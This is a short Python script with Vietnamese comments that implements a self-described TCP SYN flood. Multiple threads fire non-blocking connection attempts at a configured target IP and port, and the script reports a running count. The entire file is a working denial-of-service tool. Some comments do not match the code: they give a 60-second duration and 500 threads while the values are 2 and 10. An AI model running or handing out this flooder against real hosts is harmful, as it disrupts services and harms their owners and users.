import socket
import threading
import time
import sys
import random

# --- CẤU HÌNH TẤN CÔNG ---
TARGET_IP = "172.20.1.140" # IP máy bạn (dùng IP LAN nhé)
TARGET_PORT = 8080            # Port nào cũng được (80, 443, 8080)
THREAD_COUNT = 10          # Số luồng (Tăng lên để spam mạnh hơn)
DURATION = 2               # Tấn công trong 60 giây

# Biến đếm toàn cục
total_packets = 0
is_running = True

def tcp_flood_worker():
    global total_packets
    while is_running:
        try:
            # Tạo socket TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Quan trọng: Set chế độ Non-blocking (Không chờ đợi)
            s.setblocking(False)
            
            # Gửi yêu cầu kết nối (Gói SYN sẽ bay đi ngay lập tức)
            # connect_ex trả về lỗi vì ta không chờ, nhưng gói tin đã đi rồi
            s.connect_ex((TARGET_IP, TARGET_PORT))
            
            # Tăng biến đếm và đóng ngay để giải phóng tài nguyên
            total_packets += 1
            s.close()
            
        except Exception:
            # Lỗi là chuyện bình thường khi flood, cứ bỏ qua và bắn tiếp
            pass

def main():
    global is_running
    print(f"🚀 Đang khởi động TCP SYN Flood vào {TARGET_IP}:{TARGET_PORT}")
    print(f"🔥 Số luồng: {THREAD_COUNT} | Thời gian: {DURATION}s")
    print("---------------------------------------------------")

    threads = []
    
    # Khởi động 500 chiến binh
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=tcp_flood_worker, daemon=True)
        t.start()
        threads.append(t)

    # Đồng hồ đếm ngược
    start_time = time.time()
    try:
        while time.time() - start_time < DURATION:
            time.sleep(1)
            # Tính tốc độ hiện tại
            print(f"⚡ Tốc độ gửi: {total_packets} packets (Total) ...", end='\r')
    except KeyboardInterrupt:
        print("\n🛑 Đang dừng...")

    is_running = False
    print(f"\n✅ Đã hoàn tất! Tổng số yêu cầu gửi đi: {total_packets}")

if __name__ == "__main__":
    main()